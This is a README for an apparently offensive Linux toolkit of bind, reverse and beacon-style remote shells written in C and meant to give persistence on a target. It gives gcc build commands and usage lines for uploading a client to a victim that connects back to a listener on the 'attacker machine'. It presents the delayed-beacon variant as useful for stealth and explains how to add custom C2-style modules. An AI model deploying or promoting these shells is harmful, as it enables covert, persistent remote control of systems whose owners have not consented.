# Description
These are binaries that you can compile and execute to obtain persistence.
- Bind Shells
- Reverse Shells
- Beacon-like Shells

Note: Currently these shells are Linux specific meaning they most likely won't run on Windows OS. Windows shells will come in the future though!

# Compiling
To compile the bind and reverse shells, simply run:
```
gcc -o server server.c && gcc -o client client.c
```

To compile the beacon shells:
```
gcc -Iinclude -o payload payload.c execute.c && gcc -o server server.c
```

# Usage

## Bind Shells
Multi-client bind shell is a work in progress. Currently, only one client can connect at a time. 
```
./server <PORT>

rlwrap ./client <IP> <Port>
```
I also suggest using the `rlwrap` tool when executing the client. This tool allows you to scroll through previous commands and use arrow keys to edit your commands.

## Reverse Shells
Works like a standard reverse shell payload. Just upload and run. The server is the listener, so it's executed on your attacker machine.
```
rlwrap ./server <PORT>

./client <IP> <PORT>
```

## Beacon Shells
These are basically reverse shells except they have a delay in which they grab commands and you can execute binaries as you would in a C2 server. This can be helpful in stealth. HTTP based beacon shells may come in the future!
```
rlwrap ./server <PORT>

./client <IP> <PORT>
```
A feature I implemented with this is that it's easily customizable. You can add your own modules in 3 steps.
1. Define your function name within include/commands.h 
2. Add your function to the `execute.c` program
3. Insert your function name to the dictionary right above the main function in `payload.c`. Follow the format of previous entries.

After that everything should be good to go and ready for use. 
